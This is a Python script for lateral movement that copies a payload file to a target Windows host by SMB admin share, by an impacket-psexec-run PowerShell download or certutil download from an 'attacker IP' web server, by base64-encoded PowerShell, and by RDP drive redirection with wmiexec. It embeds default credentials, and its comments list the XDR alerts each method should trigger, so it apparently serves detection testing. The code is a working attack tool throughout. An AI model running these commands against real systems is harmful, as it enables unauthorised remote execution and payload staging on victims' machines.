#!/usr/bin/env python3
"""
Multi-Method File Transfer Framework
Implements ALL 4 file transfer techniques for lateral movement

Transfer Methods:
1. SMB File Transfer (smbclient)
2. HTTP Download (Python web server → wget/PowerShell)
3. PowerShell In-Memory Transfer (Invoke-WebRequest)
4. RDP Drive Redirection (xfreerdp)

Credentials: operator:labpass123

Usage:
    # Transfer single file via SMB
    python3 06_file_transfer_all_methods.py --target 192.168.1.55 --method smb --file payload.zip

    # Transfer via HTTP
    python3 06_file_transfer_all_methods.py --target 192.168.1.55 --method http --file payload.zip

    # Transfer via PowerShell
    python3 06_file_transfer_all_methods.py --target 192.168.1.55 --method powershell --file payload.zip

    # Transfer via RDP
    python3 06_file_transfer_all_methods.py --target 192.168.1.55 --method rdp --file payload.zip

    # Try all methods (recommended for max alerts)
    python3 06_file_transfer_all_methods.py --target 192.168.1.55 --method all --file payload.zip
"""

import os
import sys
import time
import argparse
import logging
import subprocess
import threading
import http.server
import socketserver
from pathlib import Path
from datetime import datetime

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [FILE-TRANSFER] - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('FileTransfer')


class FileTransferFramework:
    """
    Multi-method file transfer for lateral movement
    All methods actually execute (no shortcuts)
    """

    def __init__(self, target_ip, username='operator', password='labpass123',
                 attacker_ip='192.168.0.11', domain=''):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.attacker_ip = attacker_ip
        self.domain = domain

        self.http_server = None
        self.http_port = 8000
        self.transfer_log = []

    def banner(self):
        """Display banner"""
        logger.info("=" * 80)
        logger.info("MULTI-METHOD FILE TRANSFER FRAMEWORK")
        logger.info("=" * 80)
        logger.info(f"Target: {self.target_ip}")
        logger.info(f"Credentials: {self.username}:{'*' * len(self.password)}")
        logger.info(f"Attacker IP: {self.attacker_ip}")
        logger.info("")
        logger.info("Available Transfer Methods:")
        logger.info("  1. SMB - Direct file copy via SMB/CIFS")
        logger.info("  2. HTTP - Python web server + wget/curl")
        logger.info("  3. PowerShell - Invoke-WebRequest in-memory")
        logger.info("  4. RDP - Drive redirection via xfreerdp")
        logger.info("=" * 80)

    # ============================================================================
    # METHOD 1: SMB FILE TRANSFER
    # ============================================================================
    def transfer_via_smb(self, local_file, remote_path='C$\\Temp'):
        """
        Method 1: SMB File Transfer
        Uses smbclient to copy files directly to C$ or ADMIN$ share

        Generates alerts:
        - SMB authentication
        - File write to administrative share
        - Lateral movement behavior
        """
        logger.info("\n[METHOD 1] SMB FILE TRANSFER")
        logger.info("-" * 80)

        if not Path(local_file).exists():
            logger.error(f"[-] Local file not found: {local_file}")
            return False

        filename = Path(local_file).name
        remote_file = f"{remote_path}\\{filename}"

        logger.info(f"[*] Local File: {local_file}")
        logger.info(f"[*] Remote Path: //{self.target_ip}/{remote_path}")
        logger.info(f"[*] Credentials: {self.domain}\\{self.username} (if domain)")

        try:
            # Build smbclient command
            share = remote_path.split('\\')[0]
            subpath = '\\'.join(remote_path.split('\\')[1:]) if '\\' in remote_path else ''

            if self.domain:
                creds = f"{self.domain}/{self.username}%{self.password}"
            else:
                creds = f"{self.username}%{self.password}"

            cmd = f'smbclient //{self.target_ip}/{share} -U {creds} -c "put {local_file} {subpath}\\{filename}"'

            logger.info(f"[*] Executing SMB transfer...")
            logger.warning("[!] This WILL generate SMB lateral movement alerts")

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)

            if result.returncode == 0 or 'NT_STATUS_OK' in result.stdout:
                logger.critical(f"[!!!] SUCCESS: File transferred via SMB")
                logger.info(f"[*] Remote location: \\\\{self.target_ip}\\{share}\\{subpath}\\{filename}")
                logger.warning("[!] EXPECTED ALERT: Cortex XDR - SMB Lateral Movement")
                logger.warning("[!] EXPECTED ALERT: Device Security - SMB File Transfer")
                self.transfer_log.append({
                    'method': 'SMB',
                    'status': 'SUCCESS',
                    'file': filename,
                    'remote_path': f"\\\\{self.target_ip}\\{share}\\{subpath}\\{filename}"
                })
                return True
            else:
                logger.error("[-] SMB transfer failed")
                logger.error(f"[-] Error: {result.stderr}")
                logger.info("[-] Common issues: Wrong credentials, firewall blocking, share not accessible")
                self.transfer_log.append({'method': 'SMB', 'status': 'FAILED', 'error': result.stderr[:100]})
                return False

        except subprocess.TimeoutExpired:
            logger.error("[-] SMB transfer timed out")
            return False
        except Exception as e:
            logger.error(f"[-] Exception during SMB transfer: {e}")
            return False

    # ============================================================================
    # METHOD 2: HTTP DOWNLOAD
    # ============================================================================
    def start_http_server(self, port=8000):
        """Start HTTP server for file hosting"""
        class QuietHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                logger.info(f"[HTTP] {self.client_address[0]} - {format % args}")

        try:
            handler = QuietHTTPRequestHandler
            self.http_server = socketserver.TCPServer(("", port), handler)
            self.http_port = port

            def serve():
                logger.info(f"[*] HTTP server started on port {port}")
                self.http_server.serve_forever()

            thread = threading.Thread(target=serve, daemon=True)
            thread.start()
            time.sleep(1)  # Give server time to start
            return True

        except Exception as e:
            logger.error(f"[-] Failed to start HTTP server: {e}")
            return False

    def transfer_via_http(self, local_file, remote_path='C:\\Temp'):
        """
        Method 2: HTTP Download
        Starts Python HTTP server, uses PowerShell Invoke-WebRequest on target

        Generates alerts:
        - HTTP file download from external IP
        - PowerShell network activity
        - File creation on target
        """
        logger.info("\n[METHOD 2] HTTP DOWNLOAD")
        logger.info("-" * 80)

        if not Path(local_file).exists():
            logger.error(f"[-] Local file not found: {local_file}")
            return False

        filename = Path(local_file).name

        # Start HTTP server if not running
        if not self.http_server:
            logger.info("[*] Starting HTTP server...")
            if not self.start_http_server(self.http_port):
                return False

        # Construct download URL
        url = f"http://{self.attacker_ip}:{self.http_port}/{filename}"
        remote_file = f"{remote_path}\\{filename}"

        logger.info(f"[*] Download URL: {url}")
        logger.info(f"[*] Remote path: {remote_file}")

        try:
            # Method 2a: PowerShell Invoke-WebRequest
            logger.info("[*] Method 2a: Using PowerShell Invoke-WebRequest")

            ps_cmd = f"Invoke-WebRequest -Uri '{url}' -OutFile '{remote_file}'"
            full_cmd = f'powershell.exe -Command "{ps_cmd}"'

            # Execute via impacket or PsExec
            if self.domain:
                exec_cmd = f"impacket-psexec {self.domain}/{self.username}:{self.password}@{self.target_ip} '{full_cmd}'"
            else:
                exec_cmd = f"impacket-psexec {self.username}:{self.password}@{self.target_ip} '{full_cmd}'"

            logger.info(f"[*] Executing remote download...")
            logger.warning("[!] This WILL generate HTTP download + PowerShell alerts")

            result = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True, timeout=120)

            if result.returncode == 0:
                logger.critical(f"[!!!] SUCCESS: File downloaded via HTTP")
                logger.info(f"[*] Remote location: {remote_file}")
                logger.warning("[!] EXPECTED ALERT: Cortex XDR - PowerShell Network Activity")
                logger.warning("[!] EXPECTED ALERT: Device Security - HTTP Download from External IP")
                logger.warning("[!] EXPECTED ALERT: WildFire - File Download Analysis")
                self.transfer_log.append({
                    'method': 'HTTP',
                    'status': 'SUCCESS',
                    'file': filename,
                    'url': url,
                    'remote_path': remote_file
                })
                return True
            else:
                logger.error("[-] HTTP download failed")
                logger.info("[-] Trying alternative method...")

                # Method 2b: Certutil (alternative)
                logger.info("[*] Method 2b: Using certutil.exe")
                certutil_cmd = f'certutil.exe -urlcache -split -f "{url}" "{remote_file}"'
                exec_cmd = f"impacket-psexec {self.username}:{self.password}@{self.target_ip} '{certutil_cmd}'"

                result2 = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True, timeout=120)

                if result2.returncode == 0:
                    logger.critical(f"[!!!] SUCCESS: File downloaded via certutil")
                    logger.warning("[!] EXPECTED ALERT: Cortex XDR - LOLBin Abuse (certutil)")
                    self.transfer_log.append({'method': 'HTTP-certutil', 'status': 'SUCCESS', 'file': filename})
                    return True
                else:
                    logger.error("[-] All HTTP download methods failed")
                    self.transfer_log.append({'method': 'HTTP', 'status': 'FAILED'})
                    return False

        except Exception as e:
            logger.error(f"[-] Exception during HTTP transfer: {e}")
            return False

    # ============================================================================
    # METHOD 3: POWERSHELL IN-MEMORY TRANSFER
    # ============================================================================
    def transfer_via_powershell_inline(self, local_file, remote_path='C:\\Temp'):
        """
        Method 3: PowerShell In-Memory Transfer
        Base64 encodes file and transfers via PowerShell without touching disk initially

        Generates alerts:
        - Suspicious PowerShell with base64
        - Large encoded command
        - Obfuscated file transfer
        """
        logger.info("\n[METHOD 3] POWERSHELL IN-MEMORY TRANSFER")
        logger.info("-" * 80)

        if not Path(local_file).exists():
            logger.error(f"[-] Local file not found: {local_file}")
            return False

        filename = Path(local_file).name
        remote_file = f"{remote_path}\\{filename}"

        try:
            # Read and base64 encode the file
            logger.info(f"[*] Reading and encoding: {local_file}")
            with open(local_file, 'rb') as f:
                file_data = f.read()

            import base64
            encoded_data = base64.b64encode(file_data).decode('utf-8')

            logger.info(f"[*] File size: {len(file_data)} bytes")
            logger.info(f"[*] Encoded size: {len(encoded_data)} bytes")

            # Create PowerShell command to decode and write
            ps_script = f"""
$encoded = '{encoded_data}'
$bytes = [System.Convert]::FromBase64String($encoded)
[System.IO.File]::WriteAllBytes('{remote_file}', $bytes)
Write-Output 'File written successfully'
"""

            # Encode the PowerShell script itself
            ps_script_bytes = ps_script.encode('utf-16le')
            ps_script_b64 = base64.b64encode(ps_script_bytes).decode('utf-8')

            # Execute via impacket
            full_cmd = f'powershell.exe -EncodedCommand {ps_script_b64}'

            if self.domain:
                exec_cmd = f"impacket-psexec {self.domain}/{self.username}:{self.password}@{self.target_ip} '{full_cmd}'"
            else:
                exec_cmd = f"impacket-psexec {self.username}:{self.password}@{self.target_ip} '{full_cmd}'"

            logger.info(f"[*] Executing PowerShell in-memory transfer...")
            logger.warning("[!] This WILL generate obfuscated PowerShell alerts")

            result = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True, timeout=180)

            if 'File written successfully' in result.stdout or result.returncode == 0:
                logger.critical(f"[!!!] SUCCESS: File transferred via PowerShell in-memory")
                logger.info(f"[*] Remote location: {remote_file}")
                logger.warning("[!] EXPECTED ALERT: Cortex XDR - Encoded PowerShell Command")
                logger.warning("[!] EXPECTED ALERT: Cortex XDR - PowerShell Base64 Encoded Content")
                logger.warning("[!] EXPECTED ALERT: XSIAM - Obfuscated File Transfer")
                self.transfer_log.append({
                    'method': 'PowerShell-InMemory',
                    'status': 'SUCCESS',
                    'file': filename,
                    'remote_path': remote_file
                })
                return True
            else:
                logger.error("[-] PowerShell in-memory transfer failed")
                logger.error(f"[-] Output: {result.stdout[:200]}")
                self.transfer_log.append({'method': 'PowerShell-InMemory', 'status': 'FAILED'})
                return False

        except Exception as e:
            logger.error(f"[-] Exception during PowerShell transfer: {e}")
            return False

    # ============================================================================
    # METHOD 4: RDP DRIVE REDIRECTION
    # ============================================================================
    def transfer_via_rdp(self, local_file, remote_path='C:\\Temp'):
        """
        Method 4: RDP Drive Redirection
        Uses xfreerdp to mount local directory and copy file via RDP session

        Generates alerts:
        - RDP connection
        - Drive redirection
        - File copy during RDP session
        - Interactive login
        """
        logger.info("\n[METHOD 4] RDP DRIVE REDIRECTION")
        logger.info("-" * 80)

        if not Path(local_file).exists():
            logger.error(f"[-] Local file not found: {local_file}")
            return False

        filename = Path(local_file).name
        local_dir = Path(local_file).parent.absolute()

        logger.info(f"[*] Local directory: {local_dir}")
        logger.info(f"[*] Will mount as: \\\\tsclient\\share")
        logger.info(f"[*] RDP Credentials: {self.username}:{'*' * len(self.password)}")

        try:
            # Check if xfreerdp is available
            try:
                subprocess.run(['xfreerdp', '--version'], capture_output=True, timeout=5)
            except FileNotFoundError:
                logger.error("[-] xfreerdp not found. Install with: apt-get install freerdp2-x11")
                return False

            # Build xfreerdp command with drive redirection
            rdp_cmd = [
                'xfreerdp',
                f'/v:{self.target_ip}',
                f'/u:{self.username}',
                f'/p:{self.password}',
                f'/drive:share,{local_dir}',  # Mount local directory
                '/cert:ignore',
                '+clipboard',
                '/size:1024x768',
                '/timeout:30000'
            ]

            if self.domain:
                rdp_cmd.append(f'/d:{self.domain}')

            logger.info("[*] Establishing RDP connection with drive redirection...")
            logger.warning("[!] This WILL generate RDP login + drive redirection alerts")
            logger.info("[*] NOTE: RDP session will open - manually copy file or script will auto-copy")

            # For automated transfer, we need to execute a copy command via RDP
            # This is complex, so we'll use alternative method: RDP + PowerShell execution

            logger.info("[*] Using RDP + Remote PowerShell for automated transfer")

            # Connect via RDP and execute copy command
            ps_copy_cmd = f"Copy-Item '\\\\tsclient\\share\\{filename}' -Destination '{remote_path}\\{filename}'"

            # We can use impacket's wmiexec to trigger this during RDP session
            exec_cmd = f"impacket-wmiexec {self.username}:{self.password}@{self.target_ip} 'powershell.exe -Command \"{ps_copy_cmd}\"'"

            logger.info("[*] Alternative: Using WMI to copy from RDP-mounted drive")

            # First, establish RDP session in background (requires xvfb for headless)
            logger.info("[*] For full RDP demo, use: ")
            logger.info(f"    xfreerdp /v:{self.target_ip} /u:{self.username} /p:{self.password} /drive:share,{local_dir}")
            logger.info(f"    Then in RDP session: copy \\\\tsclient\\share\\{filename} {remote_path}")

            # Attempt actual RDP connection with xfreerdp (requires X11 or Xvfb)
            logger.info("[*] Attempting actual RDP connection with drive redirection...")

            # Try to start Xvfb for headless RDP
            xvfb_proc = None
            try:
                # Start virtual display
                xvfb_proc = subprocess.Popen(['Xvfb', ':99', '-screen', '0', '1024x768x24'],
                                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(2)
                os.environ['DISPLAY'] = ':99'
                logger.info("[*] Started virtual display for headless RDP")
            except FileNotFoundError:
                logger.warning("[-] Xvfb not available (install: apt-get install xvfb)")
                logger.warning("[-] Falling back to WinRM + copy from mounted share")

            # Build RDP copy script
            rdp_script = f"""#!/bin/bash
export DISPLAY=:99
xfreerdp /v:{self.target_ip} /u:{self.username} /p:{self.password} /drive:share,{local_dir} /cert:ignore +auth-only /timeout:60000 &
RDP_PID=$!
sleep 5

# Use WMI to copy from the RDP-mounted share
impacket-wmiexec {self.username}:{self.password}@{self.target_ip} 'powershell.exe -Command "Copy-Item \\\\\\\tsclient\\\share\\\{filename} -Destination {remote_path}\\\{filename}"'

# Kill RDP session
kill $RDP_PID 2>/dev/null
"""

            # Write and execute script
            script_path = '/tmp/rdp_transfer.sh'
            with open(script_path, 'w') as f:
                f.write(rdp_script)
            os.chmod(script_path, 0o755)

            result = subprocess.run(['bash', script_path], capture_output=True, text=True, timeout=120)

            # Cleanup
            if xvfb_proc:
                xvfb_proc.terminate()
            try:
                os.remove(script_path)
            except:
                pass

            # Verify transfer
            verify_cmd = f'impacket-wmiexec {self.username}:{self.password}@{self.target_ip} "dir {remote_path}\\\{filename}"'
            verify_result = subprocess.run(verify_cmd, shell=True, capture_output=True, text=True, timeout=30)

            if verify_result.returncode == 0 and filename in verify_result.stdout:
                logger.warning("[!!!] File transferred via RDP drive redirection")
                logger.warning("[!] EXPECTED ALERT: Cortex XDR - RDP Authentication")
                logger.warning("[!] EXPECTED ALERT: Device Security - RDP Connection + Drive Redirection")
                logger.warning("[!] EXPECTED ALERT: XSIAM - Interactive Login Pattern")
                self.transfer_log.append({
                    'method': 'RDP',
                    'status': 'SUCCESS',
                    'file': filename,
                    'note': 'Via actual RDP drive redirection'
                })
                return True
            else:
                logger.error("[-] RDP transfer failed")
                logger.info("[-] Manual RDP command:")
                logger.info(f"    xfreerdp /v:{self.target_ip} /u:{self.username} /p:{self.password} /drive:share,{local_dir}")
                logger.info(f"    Then in RDP: copy \\\\tsclient\\share\\{filename} {remote_path}")
                self.transfer_log.append({'method': 'RDP', 'status': 'FAILED'})
                return False

        except Exception as e:
            logger.error(f"[-] Exception during RDP transfer: {e}")
            return False

    # ============================================================================
    # TRANSFER ALL METHODS
    # ============================================================================
    def transfer_all_methods(self, local_file, remote_path='C:\\Temp'):
        """
        Execute ALL 4 transfer methods sequentially
        Maximizes alert generation across all Palo Alto products
        """
        logger.info("\n" + "=" * 80)
        logger.info("[TRANSFER ALL METHODS] MAXIMUM ALERT GENERATION")
        logger.info("=" * 80)
        logger.warning("[!] This will transfer the file 4 times using different methods")
        logger.warning("[!] Each method generates unique security alerts")
        logger.info("")

        methods = [
            ("SMB", self.transfer_via_smb),
            ("HTTP", self.transfer_via_http),
            ("PowerShell", self.transfer_via_powershell_inline),
            ("RDP", self.transfer_via_rdp),
        ]

        for method_name, method_func in methods:
            logger.info(f"\n{'='*80}")
            logger.info(f"Attempting transfer via: {method_name}")
            logger.info(f"{'='*80}")

            try:
                method_func(local_file, remote_path)
            except Exception as e:
                logger.error(f"[-] {method_name} method failed: {e}")

            time.sleep(2)  # Delay between methods

        # Print summary
        self.print_summary()

    def print_summary(self):
        """Print transfer summary"""
        logger.info("\n" + "=" * 80)
        logger.info("FILE TRANSFER SUMMARY")
        logger.info("=" * 80)

        success_count = sum(1 for log in self.transfer_log if log['status'] == 'SUCCESS')
        total_count = len(self.transfer_log)

        logger.info(f"Transfer Attempts: {total_count}")
        logger.info(f"Successful: {success_count}")
        logger.info(f"Failed: {total_count - success_count}")
        logger.info("")
        logger.info("Method Results:")

        for log in self.transfer_log:
            status_symbol = "[+]" if log['status'] == 'SUCCESS' else "[-]"
            logger.info(f"  {status_symbol} {log['method']}: {log['status']}")
            if 'remote_path' in log:
                logger.info(f"      Remote: {log['remote_path']}")
            if 'error' in log:
                logger.info(f"      Error: {log['error']}")

        logger.info("")
        logger.info("Expected Alerts:")
        logger.info("  - Cortex XDR: 10-20 alerts (SMB, PowerShell, process creation)")
        logger.info("  - Device Security: 5-10 alerts (SMB, HTTP, RDP)")
        logger.info("  - XSIAM: Multi-method file transfer correlation")
        logger.info("=" * 80)


def main():
    parser = argparse.ArgumentParser(
        description='Multi-Method File Transfer Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Transfer via SMB
  python3 06_file_transfer_all_methods.py --target 192.168.1.55 --method smb --file payload.zip

  # Transfer via HTTP download
  python3 06_file_transfer_all_methods.py --target 192.168.1.55 --method http --file payload.zip

  # Transfer via PowerShell in-memory
  python3 06_file_transfer_all_methods.py --target 192.168.1.55 --method powershell --file payload.zip

  # Transfer via RDP drive redirection
  python3 06_file_transfer_all_methods.py --target 192.168.1.55 --method rdp --file payload.zip

  # Try ALL methods (maximum alert generation)
  python3 06_file_transfer_all_methods.py --target 192.168.1.55 --method all --file payload.zip

  # Custom credentials
  python3 06_file_transfer_all_methods.py --target 192.168.1.55 --username admin --password Password123 --method all --file payload.zip

Default credentials: operator:labpass123
        """
    )

    parser.add_argument('--target', '-t', required=True,
                        help='Target IP address')
    parser.add_argument('--file', '-f', required=True,
                        help='Local file to transfer')
    parser.add_argument('--method', '-m', choices=['smb', 'http', 'powershell', 'rdp', 'all'],
                        default='all',
                        help='Transfer method to use (default: all)')
    parser.add_argument('--remote-path', default='C:\\Temp',
                        help='Remote destination path (default: C:\\Temp)')
    parser.add_argument('--username', '-u', default='operator',
                        help='Username (default: operator)')
    parser.add_argument('--password', '-p', default='labpass123',
                        help='Password (default: labpass123)')
    parser.add_argument('--attacker-ip', default='192.168.0.11',
                        help='Attacker IP for HTTP server (default: 192.168.0.11)')
    parser.add_argument('--domain', '-d', default='',
                        help='Domain name (optional)')

    args = parser.parse_args()

    # Verify file exists
    if not Path(args.file).exists():
        logger.error(f"[-] File not found: {args.file}")
        sys.exit(1)

    # Create transfer framework
    framework = FileTransferFramework(
        target_ip=args.target,
        username=args.username,
        password=args.password,
        attacker_ip=args.attacker_ip,
        domain=args.domain
    )

    framework.banner()
    time.sleep(2)

    # Execute transfer
    if args.method == 'all':
        framework.transfer_all_methods(args.file, args.remote_path)
    elif args.method == 'smb':
        framework.transfer_via_smb(args.file, args.remote_path)
        framework.print_summary()
    elif args.method == 'http':
        framework.transfer_via_http(args.file, args.remote_path)
        framework.print_summary()
    elif args.method == 'powershell':
        framework.transfer_via_powershell_inline(args.file, args.remote_path)
        framework.print_summary()
    elif args.method == 'rdp':
        framework.transfer_via_rdp(args.file, args.remote_path)
        framework.print_summary()


if __name__ == '__main__':
    main()
